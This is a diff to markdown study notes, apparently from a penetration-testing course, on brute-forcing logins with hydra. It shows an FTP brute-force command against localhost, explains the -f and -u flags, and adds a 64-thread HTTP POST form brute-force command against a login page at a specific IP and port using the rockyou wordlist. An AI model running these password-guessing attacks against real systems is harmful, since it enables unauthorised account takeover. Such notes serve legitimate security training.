@@ -9,7 +9,8 @@
 | `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - Static User, Pass Wordlist |
 > we can tell hydra to stop after the first successful login by specifying the flag `-f`  
 > We will add the `-u` flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next.
-
+>
+> `hydra -l admin -P /usr/share/wordlists/rockyou.txt "http-post-form://64.227.34.91:30056/login.php:username=^USER^&password=^PASS^:F=<form name='login'" -t 64`
 
 # Wordlists
 
